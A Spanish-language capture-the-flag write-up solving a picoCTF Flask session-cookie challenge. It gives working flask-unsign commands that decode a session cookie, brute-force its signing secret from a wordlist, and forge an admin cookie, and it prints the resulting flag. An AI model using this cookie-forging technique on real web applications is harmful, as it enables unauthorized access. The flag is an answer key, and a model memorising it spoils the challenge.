## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

http://wily-courier.picoctf.net:49990/

1

How secure is a flask cookie?
## Solución
```creamos un archivo nano cookies.txt para poder usarlo después
instalamos flask para que nos ayude a resolver el reto
python -m venv venv && source venv/bin/activate
python3 -m pip install flask-unsign
identificamos la cookie que nos arroja y e identificamos nuestra clave: flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arISBg.FqiDfFo9V15Sc9HPzBVP0_D_bC8" --wordlist cookies.txt
lo que nos da algo así:
iscotto\nbiscotti\npinnotted\nsugar\nmolasses\nkiss\nfortune")
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 21 attempts
'gingersnap'
teniendo la palabra ponemos esto flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "gingersnap"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arIVHg.1PBzsuksnCE70GtAUQXohGVOhNQ
Y esto nos dará una cookie larga como la que tuvimos al encontrar las cookies de nuestro snickerdoodle, ahora lo que se hace es introducirla, lo que nos da la flag.
picoCTF{cO0ki3s_yum_b8d261f0}
```

## Notas adicionales
## Referencias
